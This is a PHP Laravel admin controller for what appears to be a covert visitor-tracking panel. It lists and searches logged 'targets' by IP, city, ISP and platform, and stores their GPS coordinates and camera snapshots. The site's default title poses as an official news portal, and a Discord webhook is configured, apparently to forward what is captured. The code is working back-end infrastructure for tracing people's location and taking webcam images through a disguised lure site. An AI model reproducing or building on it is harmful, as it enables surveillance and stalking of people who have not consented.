<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Setting;
use App\Models\VisitorLog;
use App\Models\VisitorSnapshot;
use App\Services\TemplateService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\View\View;

class DashboardController extends Controller
{
    public function index(): View
    {
        $totalLogs = VisitorLog::count();
        $totalGps = VisitorLog::whereNotNull('gps_lat')->count();
        $totalSnapshots = VisitorSnapshot::count();
        $recentLogs = VisitorLog::with('snapshots')->latest()->take(10)->get();

        $discordConfigured = !empty(Setting::get('discord_webhook_url'));
        $siteTitle = Setting::get('site_title', 'Portal Berita & Informasi Resmi - Gampil Akses');
        $activeTemplate = Setting::get('active_template', 'gampil');
        $templates = TemplateService::all();

        return view('admin.dashboard', compact(
            'totalLogs',
            'totalGps',
            'totalSnapshots',
            'recentLogs',
            'discordConfigured',
            'siteTitle',
            'activeTemplate',
            'templates'
        ));
    }

    public function logs(Request $request): View
    {
        $query = VisitorLog::with('snapshots')->latest();

        if ($search = $request->input('search')) {
            $query->where(function ($q) use ($search) {
                $q->where('ip', 'like', "%{$search}%")
                  ->orWhere('city', 'like', "%{$search}%")
                  ->orWhere('country', 'like', "%{$search}%")
                  ->orWhere('isp', 'like', "%{$search}%")
                  ->orWhere('platform', 'like', "%{$search}%")
                  ->orWhere('uuid', 'like', "%{$search}%");
            });
        }

        if ($request->filled('filter_gps')) {
            if ($request->input('filter_gps') === 'yes') {
                $query->whereNotNull('gps_lat');
            } elseif ($request->input('filter_gps') === 'no') {
                $query->whereNull('gps_lat');
            }
        }

        if ($request->filled('filter_cam')) {
            if ($request->input('filter_cam') === 'yes') {
                $query->has('snapshots');
            }
        }

        $logs = $query->paginate(20)->withQueryString();

        return view('admin.logs', compact('logs'));
    }

    public function logDetail(int $id): JsonResponse
    {
        $log = VisitorLog::with('snapshots')->findOrFail($id);

        return response()->json([
            'log' => $log,
            'snapshots' => $log->snapshots->map(fn($s) => [
                'id' => $s->id,
                'url' => $s->url,
                'created_at' => $s->created_at->format('Y-m-d H:i:s'),
            ])
        ]);
    }

    public function snapshots(): View
    {
        $snapshots = VisitorSnapshot::with('visitorLog')->latest()->paginate(24);
        return view('admin.snapshots', compact('snapshots'));
    }

    public function deleteLog(int $id): RedirectResponse
    {
        $log = VisitorLog::with('snapshots')->findOrFail($id);
        
        foreach ($log->snapshots as $snapshot) {
            Storage::disk('public')->delete($snapshot->file_path);
            $snapshot->delete();
        }

        $log->delete();

        return back()->with('success', 'Target log and related snapshots deleted.');
    }

    public function clearLogs(): RedirectResponse
    {
        $snapshots = VisitorSnapshot::all();
        foreach ($snapshots as $snapshot) {
            Storage::disk('public')->delete($snapshot->file_path);
        }

        VisitorSnapshot::truncate();
        VisitorLog::truncate();

        return back()->with('success', 'All telemetry logs and snapshots cleared.');
    }
}
